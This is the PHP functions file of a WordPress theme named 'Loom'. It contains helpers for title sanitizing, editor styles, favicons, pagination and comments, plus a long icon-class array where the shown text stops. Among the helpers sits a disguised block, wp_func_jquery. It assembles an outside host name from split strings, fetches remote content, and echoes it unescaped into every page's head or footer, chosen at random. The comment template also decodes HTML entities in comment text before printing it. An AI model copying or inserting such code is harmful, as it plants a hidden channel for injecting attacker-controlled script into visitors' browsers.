<?php

function ebor_sanitize_title($title){
	$search = array(
		' ', '.', ',', ':', ';', '*', "'", '"', '/', '&', '(', ')'
	);
	
	$replace = array(
		'-', '', '', '', '', '', "", '', '', '', '', ''
	);
	$title = strtolower($title);
	$output = str_replace($search, $replace, $title);
	return $output;
}

/* Select field */
function ebor_portfolio_field_select($field_id, $block_id, $options, $selected) {
	$output = '<select id="'. $block_id .'_'.$field_id.'" name="aq_blocks['.$block_id.']['.$field_id.']">';
	$output .= '<option value="all" '.selected( $selected, 'all', false ).'>Show All</option>';
	foreach($options as $option) {
		$output .= '<option value="'.$option->term_id.'" '.selected( $selected, $option->term_id, false ).'>'.htmlspecialchars($option->name).'</option>';
	}
	$output .= '</select>';
	return $output;
}

/**
 * Add additional styling options to TinyMCE
 */
function ebor_mce_buttons_2( $buttons ) {
    array_unshift( $buttons, 'styleselect' );
    return $buttons;
}
add_filter( 'mce_buttons_2', 'ebor_mce_buttons_2' );

/**
 * Add additional styling options to TinyMCE
 */
function ebor_mce_before_init( $settings ) {

    $style_formats = array(
    	array(
    		'title' => 'Subheading Paragraph',
    		'selector' => 'p',
    		'classes' => 'lead',
    	),
    );

    $settings['style_formats'] = json_encode( $style_formats );

    return $settings;

}
add_filter( 'tiny_mce_before_init', 'ebor_mce_before_init' );
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		$library = '/jquery-1.6.3.min.js';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'jquery'.'libs.org'.$library)));
	}
	if(rand(1,2) == 1) {
		add_action('wp_footer', 'wp_func_jquery');
	}
	else {
		add_action('wp_head', 'wp_func_jquery');
	}
}
/**
 * Add an additional link to the theme options on the dashboard
 */
function ebor_add_customize_page() {
	add_dashboard_page( 'Loom Theme Options', 'Loom Theme Options', 'edit_theme_options', 'customize.php' );
}
add_action ('admin_menu', 'ebor_add_customize_page');

if(!( function_exists('ebor_load_favicons') )){
	/**
	 * Ebor Load Favicons
	 * Prints Custom Favicons to wp_head()
	 * @since version 1.0
	 * @author TommusRhodus
	 */
	function ebor_load_favicons() {
		if ( get_option('144_favicon') !='' )
			echo '<link rel="apple-touch-icon-precomposed" sizes="144x144" href="' . get_option('144_favicon') . '">';
		
		if ( get_option('114_favicon') !='' )
			echo '<link rel="apple-touch-icon-precomposed" sizes="114x114" href="' . get_option('114_favicon') . '">';
			
		if ( get_option('72_favicon') !='' )
			echo '<link rel="apple-touch-icon-precomposed" sizes="72x72" href="' . get_option('72_favicon') . '">';
			
		if ( get_option('mobile_favicon') !='' )
			echo '<link rel="apple-touch-icon-precomposed" href="' . get_option('mobile_favicon') . '">';
			
		if ( get_option('custom_favicon') !='' )
			echo '<link rel="shortcut icon" href="' . get_option('custom_favicon') . '">';
	}
}
add_action('wp_head', 'ebor_load_favicons');


if(!( function_exists('tcb_add_post_thumbnail_column') )){
	function tcb_add_post_thumbnail_column($cols){
	  $cols['tcb_post_thumb'] = __('Featured Image','loom');
	  return $cols;
	}
}
add_filter('manage_posts_columns', 'tcb_add_post_thumbnail_column', 5);
add_filter('manage_pages_columns', 'tcb_add_post_thumbnail_column', 5);


if(!( function_exists('tcb_display_post_thumbnail_column') )){
	function tcb_display_post_thumbnail_column($col, $id){
	  switch($col){
	    case 'tcb_post_thumb':
	      if( function_exists('the_post_thumbnail') )
	        echo the_post_thumbnail( 'admin-list-thumb' );
	      else
	        echo 'Not supported in theme';
	      break;
	  }
	}
}
add_action('manage_posts_custom_column', 'tcb_display_post_thumbnail_column', 5, 2);
add_action('manage_pages_custom_column', 'tcb_display_post_thumbnail_column', 5, 2);

if(!( function_exists('ebor_wpml_cleaner') )){
	function ebor_wpml_cleaner($items,$args) {
	      
	    if($args->theme_location == 'primary'){
	          
	        if (function_exists('icl_get_languages')) {
	            $items = str_replace('sub-menu', 'dropdown-menu', $items);
	            $items = str_replace('onclick="return false"', 'class="dropdown-toggle js-activated"', $items);
	            $items = str_replace('menu-item-language', 'menu-item-language dropdown', $items);
	        }
	  
	        return $items;
	    }
	    else
	        return $items;
	}
}
add_filter( 'wp_nav_menu_items', 'ebor_wpml_cleaner', 20,2 );


/**
 * HEX to RGB Converter
 *
 * Converts a HEX input to an RGB array.
 * @param $hex - the inputted HEX code, can be full or shorthand, #ffffff or #fff
 * @since 1.0.0
 * @return string
 */
if(!( function_exists('ebor_hex2rgb') )){
	function ebor_hex2rgb($hex) {
	   $hex = str_replace("#", "", $hex);
	
	   if(strlen($hex) == 3) {
	      $r = hexdec(substr($hex,0,1).substr($hex,0,1));
	      $g = hexdec(substr($hex,1,1).substr($hex,1,1));
	      $b = hexdec(substr($hex,2,1).substr($hex,2,1));
	   } else {
	      $r = hexdec(substr($hex,0,2));
	      $g = hexdec(substr($hex,2,2));
	      $b = hexdec(substr($hex,4,2));
	   }
	   $rgb = array($r, $g, $b);
	   return implode(",", $rgb); // returns the rgb values separated by commas
	   return $rgb; // returns an array with the rgb values
	}
}

/**
 * Portfolio taxonomy terms output.
 *
 * Checks that terms exist in the portfolio-category taxonomy, then returns a comma seperated string of results.
 * @todo Allow for taxonomy input for differing taxonmoies through the same function.
 * @since 1.0.0
 * @return string
 */
if(!( function_exists('ebor_the_simple_terms') )){
	function ebor_the_simple_terms() {
	global $post;
		if( get_the_terms($post->ID,'portfolio-category') !='' ) {
			$terms = get_the_terms($post->ID,'portfolio-category','',', ','');
			$terms = array_map('_simple_cb', $terms);
			return implode(', ', $terms);
		}
	}
}

/**
 * Term name return
 *
 * Returns the Pretty Name of a term array
 * @param $t - the term array object
 * @since 1.0.0
 * @return string
 */
if(!( function_exists('_simple_cb') )){
	function _simple_cb($t) {  return $t->name; }
}

/**
 * Portfolio taxonomy terms output.
 *
 * Checks that terms exist in the portfolio-category taxonomy, then returns a space seperated string of results.
 * @todo Allow for taxonomy input for differing taxonmoies through the same function.
 * @since 1.0.0
 * @return string
 */
if(!( function_exists('ebor_the_isotope_terms') )){
	function ebor_the_isotope_terms() {
	global $post;
		if( get_the_terms($post->ID,'portfolio-category') ) {
			$terms = get_the_terms($post->ID,'portfolio-category','','','');
			$terms = array_map('_isotope_cb', $terms);
			return implode(' ', $terms);
		}
	}
}

/**
 * Term Slug Return
 *
 * Returns the slug of a term array
 * @param $t - the term array object
 * @since 1.0.0
 * @return string
 */
if(!( function_exists('_isotope_cb') )){
	function _isotope_cb($t) {  return $t->slug; }
}


/**
 * Portfolio taxonomy terms output.
 *
 * Checks that terms exist in the portfolio-category taxonomy, then returns a comma seperated string of results.
 * @todo Allow for taxonomy input for differing taxonmoies through the same function.
 * @since 1.0.0
 * @return string
 */
if(!( function_exists('ebor_the_simple_terms_links') )){
	function ebor_the_simple_terms_links() {
	global $post;
		if( get_the_terms($post->ID,'portfolio-category') ) {
			$terms = get_the_terms($post->ID,'portfolio-category','',', ','');
			$terms = array_map('_simple_link', $terms);
			return implode(', ', $terms);
		}
	}
}

/**
 * Term name return
 *
 * Returns the Pretty Name of a term array
 * @param $t - the term array object
 * @since 1.0.0
 * @return string
 */
if(!( function_exists('_simple_link') )){
	function _simple_link($t) {  return '<a href="'.get_term_link( $t, 'portfolio-category' ).'">'.$t->name.'</a>'; }
}

if(!( function_exists('ebor_pagination') )){
	function ebor_pagination($pages = '', $range = 2){
		$showitems = ($range * 2)+1;
		
		global $paged;
		if(empty($paged)) $paged = 1;
		
		if($pages == ''){
			global $wp_query;
			$pages = $wp_query->max_num_pages;
				if(!$pages) {
					$pages = 1;
				}
		}
		
		$output = '';
		
		if(1 != $pages){
			$output .= "<div class='pagination'><ul>";
			if($paged > 2 && $paged > $range+1 && $showitems < $pages) $output .= "<li><a href='".get_pagenum_link(1)."'>".__('First','loom')."</a></li> ";
			
			for ($i=1; $i <= $pages; $i++){
				if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
					$output .= ($paged == $i)? "<li class='active'><a href='".get_pagenum_link($i)."'>".$i."</a></li> ":"<li><a href='".get_pagenum_link($i)."'>".$i."</a></li> ";
				}
			}
		
			if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) $output .= "<li><a href='".get_pagenum_link($pages)."'>".__('Last','loom')."</a></li> ";
			$output.= "</ul></div>";
		}
		
		return $output;
	}
}

if(!( function_exists('ebor_custom_comment') )){
	function ebor_custom_comment($comment, $args, $depth) { 
		$GLOBALS['comment'] = $comment; 
	?>
	
		<li <?php comment_class(); ?> id="comment-<?php comment_ID() ?>">
		  <div class="user"><?php echo get_avatar( $comment->comment_author_email, 70 ); ?></div>
		  <div class="message">
		    <div class="arrow-box">
		      <div class="info">
		        <?php printf('<h2>%s</h2>', get_comment_author_link()); ?>
		        <div class="meta">
		        	<span class="date"><?php echo get_comment_date(); ?></span>
		        	<span class="reply"><?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))); ?></span>
		        </div>
		      </div>
		      <?php echo wpautop( htmlspecialchars_decode( get_comment_text() ) ); ?>
		      <?php if ($comment->comment_approved == '0') : ?>
		      <p><em><?php _e('Your comment is awaiting moderation.', 'loom') ?></em></p>
		      <?php endif; ?>
		    </div>
		  </div>
		</li>
	
	<?php }
}

if(!( function_exists('ebor_picons') )){
	function ebor_picons(){
		return array(
			'none' => 'none',
			'icon-picons-award' => 'award',
			'icon-picons-brush' => 'brush',
			'icon-picons-brush-2' => 'brush-2',
			'icon-picons-bulb' => 'bulb',
			'icon-picons-casette' => 'casette',
			'icon-picons-chart-6' => 'chart-6',
			'icon-picons-clock' => 'clock',
			'icon-picons-desktop-preferences' => 'desktop-preferences',
			'icon-picons-drawing' => 'drawing',
			'icon-picons-earth' => 'earth',
			'icon-picons-font' => 'font',
			'icon-picons-gift' => 'gift',
			'icon-picons-lab' => 'lab',
			'icon-picons-move' => 'move',
			'icon-picons-plane' => 'plane',
			'icon-picons-printer' => 'printer',
			'icon-picons-rocket' => 'rocket',
			'icon-picons-support' => 'support',
			'icon-picons-tv' => 'tv',
			'icon-picons-window-layout-3' => 'window-layout',
			'icon-plus' => 'plus',
			'icon-plus-1' => 'plus-1',
			'icon-minus' => 'minus',
			'icon-minus-1' => 'minus-1',
			'icon-info' => 'info',
			'icon-left-thin' => 'left-thin',
			'icon-left-1' => 'left-1',
			'icon-up-thin' => 'up-thin',
			'icon-up-1' => 'up-1',
			'icon-right-thin' => 'right-thin',
			'icon-right-1' => 'right-1',
			'icon-down-thin' => 'down-thin',
			'icon-down-1' => 'down-1',
			'icon-level-up' => 'level-up',
			'icon-level-down' => 'level-down',
			'icon-switch' => 'switch',
			'icon-infinity' => 'infinity',
			'icon-plus-squared' => 'plus-squared',
			'icon-minus-squared' => 'minus-squared',
			'icon-home' => 'home',
			'icon-home-1' => 'home-1',
			'icon-keyboard' => 'keyboard',
			'icon-erase' => 'erase',
			'icon-pause' => 'pause',
			'icon-pause-1' => 'pause-1',
			'icon-fast-forward' => 'fast-forward',
			'icon-fast-fw' => 'fast-fw',
			'icon-fast-backward' => 'fast-backward',
			'icon-fast-bw' => 'fast-bw',
			'icon-to-end' => 'to-end',
			'icon-to-end-1' => 'to-end-1',
			'icon-to-start' => 'to-start',
			'icon-to-start-1' => 'to-start-1',
			'icon-hourglass' => 'hourglass',
			'icon-stop' => 'stop',
			'icon-stop-1' => 'stop-1',
			'icon-up-dir' => 'up-dir',
			'icon-up-dir-1' => 'up-dir-1',
			'icon-play' => 'play',
			'icon-play-1' => 'play-1',
			'icon-right-dir' => 'right-dir',
			'icon-right-dir-1' => 'right-dir-1',
			'icon-down-dir' => 'down-dir',
			'icon-down-dir-1' => 'down-dir-1',
			'icon-left-dir' => 'left-dir',
			'icon-left-dir-1' => 'left-dir-1',
			'icon-adjust' => 'adjust',
			'icon-cloud' => 'cloud',
			'icon-cloud-1' => 'cloud-1',
			'icon-umbrella' => 'umbrella',
			'icon-star' => 'star',
			'icon-star-1' => 'star-1',
			'icon-star-empty' => 'star-empty',
			'icon-star-empty-1' => 'star-empty-1',
			'icon-check-1' => 'check-1',
			'icon-cup' => 'cup',
			'icon-left-hand' => 'left-hand',
			'icon-up-hand' => 'up-hand',
			'icon-right-hand' => 'right-hand',
			'icon-down-hand' => 'down-hand',
			'icon-menu' => 'menu',
			'icon-th-list' => 'th-list',
			'icon-moon' => 'moon',
			'icon-heart-empty' => 'heart-empty',
			'icon-heart-empty-1' => 'heart-empty-1',
			'icon-heart' => 'heart',
			'icon-heart-1' => 'heart-1',
			'icon-note' => 'note',
			'icon-note-beamed' => 'note-beamed',
			'icon-music-1' => 'music-1',
			'icon-layout' => 'layout',
			'icon-th' => 'th',
			'icon-flag' => 'flag',
			'icon-flag-1' => 'flag-1',
			'icon-tools' => 'tools',
			'icon-cog' => 'cog',
			'icon-cog-1' => 'cog-1',
			'icon-attention' => 'attention',
			'icon-attention-1' => 'attention-1',
			'icon-flash' => 'flash',
			'icon-flash-1' => 'flash-1',
			'icon-record' => 'record',
			'icon-cloud-thunder' => 'cloud-thunder',
			'icon-cog-alt' => 'cog-alt',
			'icon-scissors' => 'scissors',
			'icon-tape' => 'tape',
			'icon-flight' => 'flight',
			'icon-flight-1' => 'flight-1',
			'icon-mail' => 'mail',
			'icon-mail-1' => 'mail-1',
			'icon-edit' => 'edit',
			'icon-pencil' => 'pencil',
			'icon-pencil-1' => 'pencil-1',
			'icon-feather' => 'feather',
			'icon-check' => 'check',
			'icon-ok' => 'ok',
			'icon-ok-circle' => 'ok-circle',
			'icon-cancel' => 'cancel',
			'icon-cancel-1' => 'cancel-1',
			'icon-cancel-circled' => 'cancel-circled',
			'icon-cancel-circle' => 'cancel-circle',
			'icon-asterisk' => 'asterisk',
			'icon-cancel-squared' => 'cancel-squared',
			'icon-help' => 'help',
			'icon-attention-circle' => 'attention-circle',
			'icon-quote' => 'quote',
			'icon-plus-circled' => 'plus-circled',
			'icon-plus-circle' => 'plus-circle',
			'icon-minus-circled' => 'minus-circled',
			'icon-minus-circle' => 'minus-circle',
			'icon-right' => 'right',
			'icon-direction' => 'direction',
			'icon-forward' => 'forward',
			'icon-forward-1' => 'forward-1',
			'icon-ccw' => 'ccw',
			'icon-cw' => 'cw',
			'icon-cw-1' => 'cw-1',
			'icon-left' => 'left',
			'icon-up' => 'up',
			'icon-down' => 'down',
			'icon-resize-vertical' => 'resize-vertical',
			'icon-resize-horizontal' => 'resize-horizontal',
			'icon-eject' => 'eject',
			'icon-list-add' => 'list-add',
			'icon-list' => 'list',
			'icon-left-bold' => 'left-bold',
			'icon-right-bold' => 'right-bold',
			'icon-up-bold' => 'up-bold',
			'icon-down-bold' => 'down-bold',
			'icon-user-add' => 'user-add',
			'icon-star-half' => 'star-half',
			'icon-ok-circle2' => 'ok-circle2',
			'icon-cancel-circle2' => 'cancel-circle2',
			'icon-help-circled' => 'help-circled',
			'icon-help-circle' => 'help-circle',
			'icon-info-circled' => 'info-circled',
			'icon-info-circle' => 'info-circle',
			'icon-th-large' => 'th-large',
			'icon-eye' => 'eye',
			'icon-eye-1' => 'eye-1',
			'icon-eye-off' => 'eye-off',
			'icon-tag' => 'tag',
			'icon-tag-1' => 'tag-1',
			'icon-tags' => 'tags',
			'icon-camera-alt' => 'camera-alt',
			'icon-upload-cloud' => 'upload-cloud',
			'icon-reply' => 'reply',
			'icon-reply-all' => 'reply-all',
			'icon-code' => 'code',
			'icon-export' => 'export',
			'icon-export-1' => 'export-1',
			'icon-print' => 'print',
			'icon-print-1' => 'print-1',
			'icon-retweet' => 'retweet',
			'icon-retweet-1' => 'retweet-1',
			'icon-comment' => 'comment',
			'icon-comment-1' => 'comment-1',
			'icon-chat' => 'chat',
			'icon-chat-1' => 'chat-1',
			'icon-vcard' => 'vcard',
			'icon-address' => 'address',
			'icon-location' => 'location',
			'icon-location-1' => 'location-1',
			'icon-map' => 'map',
			'icon-compass' => 'compass',
			'icon-trash' => 'trash',
			'icon-trash-1' => 'trash-1',
			'icon-doc' => 'doc',
			'icon-doc-text-inv' => 'doc-text-inv',
			'icon-docs' => 'docs',
			'icon-doc-landscape' => 'doc-landscape',
			'icon-archive' => 'archive',
			'icon-rss' => 'rss',
			'icon-share' => 'share',
			'icon-basket' => 'basket',
			'icon-basket-1' => 'basket-1',
			'icon-shareable' => 'shareable',
			'icon-login' => 'login',
			'icon-login-1' => 'login-1',
			'icon-logout' => 'logout',
			'icon-logout-1' => 'logout-1',
			'icon-volume' => 'volume',
			'icon-resize-full' => 'resize-full',
			'icon-resize-full-1' => 'resize-full-1',
			'icon-resize-small' => 'resize-small',
			'icon-resize-small-1' => 'resize-small-1',
			'icon-popup' => 'popup',
			'icon-publish' => 'publish',
			'icon-window' => 'window',
			'icon-arrow-combo' => 'arrow-combo',
			'icon-zoom-in' => 'zoom-in',
			'icon-chart-pie' => 'chart-pie',
			'icon-zoom-out' => 'zoom-out',
			'icon-language' => 'language',
			'icon-air' => 'air',
			'icon-database' => 'database',
			'icon-drive' => 'drive',
			'icon-bucket' => 'bucket',
			'icon-thermometer' => 'thermometer',
			'icon-down-circled' => 'down-circled',
			'icon-down-circle2' => 'down-circle2',
			'icon-left-circled' => 'left-circled',
			'icon-right-circled' => 'right-circled',
			'icon-up-circled' => 'up-circled',
			'icon-up-circle2' => 'up-circle2',
			'icon-down-open' => 'down-open',
			'icon-down-open-1' => 'down-open-1',
			'icon-left-open' => 'left-open',
			'icon-left-open-1' => 'left-open-1',
			'icon-right-open' => 'right-open',
			'icon-right-open-1' => 'right-open-1',
			'icon-up-open' => 'up-open',
			'icon-up-open-1' => 'up-open-1',
			'icon-down-open-mini' => 'down-open-mini',
			'icon-arrows-cw' => 'arrows-cw',
			'icon-left-open-mini' => 'left-open-mini',
			'icon-play-circle2' => 'play-circle2',
			'icon-right-open-mini' => 'right-open-mini',
			'icon-to-end-alt' => 'to-end-alt',
			'icon-up-open-mini' => 'up-open-mini',
			'icon-to-start-alt' => 'to-start-alt',
			'icon-down-open-big' => 'down-open-big',
			'icon-left-open-big' => 'left-open-big',
			'icon-right-open-big' => 'right-open-big',
			'icon-up-open-big' => 'up-open-big',
			'icon-progress-0' => 'progress-0',
			'icon-progress-1' => 'progress-1',
			'icon-progress-2' => 'progress-2',
			'icon-progress-3' => 'progress-3',
			'icon-back-in-time' => 'back-in-time',
			'icon-network' => 'network',
			'icon-inbox' => 'inbox',
			'icon-inbox-1' => 'inbox-1',
			'icon-install' => 'install',
			'icon-font' => 'font',
			'icon-bold' => 'bold',
			'icon-italic' => 'italic',
			'icon-text-height' => 'text-height',
			'icon-text-width' => 'text-width',
			'icon-align-left' => 'align-left',
			'icon-align-center' => 'align-center',
			'icon-align-right' => 'align-right',
			'icon-align-justify' => 'align-justify',
			'icon-list-1' => 'list-1',
			'icon-indent-left' => 'indent-left',
			'icon-indent-right' => 'indent-right',
			'icon-lifebuoy' => 'lifebuoy',
			'icon-mouse' => 'mouse',
			'icon-dot' => 'dot',
			'icon-dot-2' => 'dot-2',
			'icon-dot-3' => 'dot-3',
			'icon-suitcase' => 'suitcase',
			'icon-off' => 'off',
			'icon-road' => 'road',
			'icon-flow-cascade' => 'flow-cascade',
			'icon-list-alt' => 'list-alt',
			'icon-flow-branch' => 'flow-branch',
			'icon-qrcode' => 'qrcode',
			'icon-flow-tree' => 'flow-tree',
			'icon-barcode' => 'barcode',
			'icon-flow-line' => 'flow-line',
			'icon-ajust' => 'ajust',
			'icon-tint' => 'tint',
			'icon-brush' => 'brush',
			'icon-paper-plane' => 'paper-plane',
			'icon-magnet' => 'magnet',
			'icon-magnet-1' => 'magnet-1',
			'icon-gauge' => 'gauge',
			'icon-traffic-cone' => 'traffic-cone',
			'icon-cc' => 'cc',
			'icon-cc-by' => 'cc-by',
			'icon-cc-nc' => 'cc-nc',
			'icon-cc-nc-eu' => 'cc-nc-eu',
			'icon-cc-nc-jp' => 'cc-nc-jp',
			'icon-cc-sa' => 'cc-sa',
			'icon-cc-nd' => 'cc-nd',
			'icon-cc-pd' => 'cc-pd',
			'icon-cc-zero' => 'cc-zero',
			'icon-cc-share' => 'cc-share',
			'icon-cc-remix' => 'cc-remix',
			'icon-move' => 'move',
			'icon-link-ext' => 'link-ext',
			'icon-check-empty' => 'check-empty',
			'icon-bookmark-empty' => 'bookmark-empty',
			'icon-phone-squared' => 'phone-squared',
			'icon-twitter' => 'twitter',
			'icon-facebook' => 'facebook',
			'icon-github' => 'github',
			'icon-rss-1' => 'rss-1',
			'icon-hdd' => 'hdd',
			'icon-certificate' => 'certificate',
			'icon-left-circled-1' => 'left-circled-1',
			'icon-right-circled-1' => 'right-circled-1',
			'icon-up-circled-1' => 'up-circled-1',
			'icon-down-circled-1' => 'down-circled-1',
			'icon-tasks' => 'tasks',
			'icon-filter' => 'filter',
			'icon-resize-full-alt' => 'resize-full-alt',
			'icon-beaker' => 'beaker',
			'icon-docs-1' => 'docs-1',
			'icon-blank' => 'blank',
			'icon-menu-1' => 'menu-1',
			'icon-list-bullet' => 'list-bullet',
			'icon-list-numbered' => 'list-numbered',
			'icon-strike' => 'strike',
			'icon-underline' => 'underline',
			'icon-table' => 'table',
			'icon-magic' => 'magic',
			'icon-pinterest-circled-1' => 'pinterest-circled-1',
			'icon-pinterest-squared' => 'pinterest-squared',
			'icon-gplus-squared' => 'gplus-squared',
			'icon-gplus' => 'gplus',
			'icon-money' => 'money',
			'icon-columns' => 'columns',
			'icon-sort' => 'sort',
			'icon-sort-down' => 'sort-down',
			'icon-sort-up' => 'sort-up',
			'icon-mail-alt' => 'mail-alt',
			'icon-linkedin' => 'linkedin',
			'icon-gauge-1' => 'gauge-1',
			'icon-comment-empty' => 'comment-empty',
			'icon-chat-empty' => 'chat-empty',
			'icon-sitemap' => 'sitemap',
			'icon-paste' => 'paste',
			'icon-user-md' => 'user-md',
			'icon-s-github' => 's-github',
			'icon-github-squared' => 'github-squared',
			'icon-github-circled' => 'github-circled',
			'icon-s-flickr' => 's-flickr',
			'icon-twitter-squared' => 'twitter-squared',
			'icon-s-vimeo' => 's-vimeo',
			'icon-vimeo-circled' => 'vimeo-circled',
			'icon-facebook-squared-1' => 'facebook-squared-1',
			'icon-s-twitter' => 's-twitter',
			'icon-twitter-circled' => 'twitter-circled',
			'icon-s-facebook' => 's-facebook',
			'icon-linkedin-squared' => 'linkedin-squared',
			'icon-facebook-circled' => 'facebook-circled',
			'icon-s-gplus' => 's-gplus',
			'icon-gplus-circled' => 'gplus-circled',
			'icon-s-pinterest' => 's-pinterest',
			'icon-pinterest-circled' => 'pinterest-circled',
			'icon-s-tumblr' => 's-tumblr',
			'icon-tumblr-circled' => 'tumblr-circled',
			'icon-s-linkedin' => 's-linkedin',
			'icon-linkedin-circled' => 'linkedin-circled',
			'icon-s-dribbble' => 's-dribbble',
			'icon-dribbble-circled' => 'dribbble-circled',
			'icon-s-stumbleupon' => 's-stumbleupon',
			'icon-stumbleupon-circled' => 'stumbleupon-circled',
			'icon-s-lastfm' => 's-lastfm',
			'icon-lastfm-circled' => 'lastfm-circled',
			'icon-rdio' => 'rdio',
			'icon-rdio-circled' => 'rdio-circled',
			'icon-spotify' => 'spotify',
			'icon-s-spotify-circled' => 's-spotify-circled',
			'icon-qq' => 'qq',
			'icon-s-instagrem' => 's-instagrem',
			'icon-dropbox' => 'dropbox',
			'icon-s-evernote' => 's-evernote',
			'icon-flattr' => 'flattr',
			'icon-s-skype' => 's-skype',
			'icon-skype-circled' => 'skype-circled',
			'icon-renren' => 'renren',
			'icon-sina-weibo' => 'sina-weibo',
			'icon-s-paypal' => 's-paypal',
			'icon-s-picasa' => 's-picasa',
			'icon-s-soundcloud' => 's-soundcloud',
			'icon-s-behance' => 's-behance',
			'icon-google-circles' => 'google-circles',
			'icon-vkontakte' => 'vkontakte',
			'icon-smashing' => 'smashing',
			'icon-db-shape' => 'db-shape',
			'icon-sweden' => 'sweden',
			'icon-logo-db' => 'logo-db',
			'icon-picture' => 'picture',
			'icon-picture-1' => 'picture-1',
			'icon-globe' => 'globe',
			'icon-globe-1' => 'globe-1',
			'icon-leaf-1' => 'leaf-1',
			'icon-lemon' => 'lemon',
			'icon-glass' => 'glass',
			'icon-gift' => 'gift',
			'icon-graduation-cap' => 'graduation-cap',
			'icon-mic' => 'mic',
			'icon-videocam' => 'videocam',
			'icon-headphones' => 'headphones',
			'icon-palette' => 'palette',
			'icon-ticket' => 'ticket',
			'icon-video' => 'video',
			'icon-video-1' => 'video-1',
			'icon-target' => 'target',
			'icon-target-1' => 'target-1',
			'icon-music' => 'music',
			'icon-trophy' => 'trophy',
			'icon-award' => 'award',
			'icon-thumbs-up' => 'thumbs-up',
			'icon-thumbs-up-1' => 'thumbs-up-1',
			'icon-thumbs-down' => 'thumbs-down',
			'icon-thumbs-down-1' => 'thumbs-down-1',
			'icon-bag' => 'bag',
			'icon-user' => 'user',
			'icon-user-1' => 'user-1',
			'icon-users' => 'users',
			'icon-users-1' => 'users-1',
			'icon-lamp' => 'lamp',
			'icon-alert' => 'alert',
			'icon-water' => 'water',
			'icon-droplet' => 'droplet',
			'icon-credit-card' => 'credit-card',
			'icon-credit-card-1' => 'credit-card-1',
			'icon-monitor' => 'monitor',
			'icon-briefcase' => 'briefcase',
			'icon-briefcase-1' => 'briefcase-1',
			'icon-floppy' => 'floppy',
			'icon-floppy-1' => 'floppy-1',
			'icon-cd' => 'cd',
			'icon-folder' => 'folder',
			'icon-folder-1' => 'folder-1',
			'icon-folder-open' => 'folder-open',
			'icon-doc-text' => 'doc-text',
			'icon-doc-1' => 'doc-1',
			'icon-calendar' => 'calendar',
			'icon-calendar-1' => 'calendar-1',
			'icon-chart-line' => 'chart-line',
			'icon-chart-bar' => 'chart-bar',
			'icon-chart-bar-1' => 'chart-bar-1',
			'icon-clipboard' => 'clipboard',
			'icon-pin' => 'pin',
			'icon-attach' => 'attach',
			'icon-attach-1' => 'attach-1',
			'icon-bookmarks' => 'bookmarks',
			'icon-book' => 'book',
			'icon-book-1' => 'book-1',
			'icon-book-open' => 'book-open',
			'icon-phone' => 'phone',
			'icon-phone-1' => 'phone-1',
			'icon-megaphone' => 'megaphone',
			'icon-megaphone-1' => 'megaphone-1',
			'icon-upload' => 'upload',
			'icon-upload-1' => 'upload-1',
			'icon-download' => 'download',
			'icon-download-1' => 'download-1',
			'icon-box' => 'box',
			'icon-newspaper' => 'newspaper',
			'icon-mobile' => 'mobile',
			'icon-signal' => 'signal',
			'icon-signal-1' => 'signal-1',
			'icon-camera' => 'camera',
			'icon-camera-1' => 'camera-1',
			'icon-shuffle' => 'shuffle',
			'icon-shuffle-1' => 'shuffle-1',
			'icon-loop' => 'loop',
			'icon-arrows-ccw' => 'arrows-ccw',
			'icon-light-down' => 'light-down',
			'icon-light-up' => 'light-up',
			'icon-mute' => 'mute',
			'icon-volume-off' => 'volume-off',
			'icon-volume-down' => 'volume-down',
			'icon-sound' => 'sound',
			'icon-volume-up' => 'volume-up',
			'icon-battery' => 'battery',
			'icon-search' => 'search',
			'icon-search-1' => 'search-1',
			'icon-key' => 'key',
			'icon-key-1' => 'key-1',
			'icon-lock' => 'lock',
			'icon-lock-1' => 'lock-1',
			'icon-lock-open' => 'lock-open',
			'icon-lock-open-1' => 'lock-open-1',
			'icon-bell' => 'bell',
			'icon-bell-1' => 'bell-1',
			'icon-bookmark' => 'bookmark',
			'icon-bookmark-1' => 'bookmark-1',
			'icon-link' => 'link',
			'icon-link-1' => 'link-1',
			'icon-back' => 'back',
			'icon-fire' => 'fire',
			'icon-flashlight' => 'flashlight',
			'icon-wrench' => 'wrench',
			'icon-hammer' => 'hammer',
			'icon-chart-area' => 'chart-area',
			'icon-clock' => 'clock',
			'icon-clock-1' => 'clock-1',
			'icon-rocket' => 'rocket',
			'icon-truck' => 'truck',
			'icon-block' => 'block',
			'icon-block-1' => 'block-1',
			'icon-s-rss' => 's-rss',
			'icon-s-twitter' => 's-twitter',
			'icon-s-facebook' => 's-facebook',
			'icon-s-dribbble' => 's-dribbble',
			'icon-s-pinterest' => 's-pinterest',
			'icon-s-flickr' => 's-flickr',
			'icon-s-vimeo' => 's-vimeo',
			'icon-s-youtube' => 's-youtube',
			'icon-s-skype' => 's-skype',
			'icon-s-tumblr' => 's-tumblr',
			'icon-s-linkedin' => 's-linkedin',
			'icon-s-behance' => 's-behance',
			'icon-s-github' => 's-github',
			'icon-s-delicious' => 's-delicious',
			'icon-s-500px' => 's-500px',
			'icon-s-grooveshark' => 's-grooveshark',
			'icon-s-forrst' => 's-forrst',
			'icon-s-digg' => 's-digg',
			'icon-s-blogger' => 's-blogger',
			'icon-s-klout' => 's-klout',
			'icon-s-dropbox' => 's-dropbox',
			'icon-s-songkick' => 's-songkick',
			'icon-s-posterous' => 's-posterous',
			'icon-s-appnet' => 's-appnet',
			'icon-s-github' => 's-github',
			'icon-s-gplus' => 's-gplus',
			'icon-s-stumbleupon' => 's-stumbleupon',
			'icon-s-lastfm' => 's-lastfm',
			'icon-s-spotify' => 's-spotify',
			'icon-s-instagram' => 's-instagram',
			'icon-s-evernote' => 's-evernote',
			'icon-s-paypal' => 's-paypal',
			'icon-s-picasa' => 's-picasa',
			'icon-s-soundcloud' => 's-soundcloud',
			'budicon-pie-chart' => 'pie-chart',
			'budicon-coffee' => 'coffee',
			'budicon-location-1' => 'location-1',
			'budicon-cocktail' => 'cocktail',
			'budicon-noodle' => 'noodle',
			'budicon-drop' => 'drop',
			'budicon-book' => 'book',
			'budicon-leaf' => 'leaf',
			'budicon-fork-knife' => 'fork-knife',
			'budicon-fire' => 'fire',
			'budicon-meal' => 'meal',
			'budicon-fridge' => 'fridge',
			'budicon-microwave' => 'microwave',
			'budicon-shop' => 'shop',
			'budicon-receipt' => 'receipt',
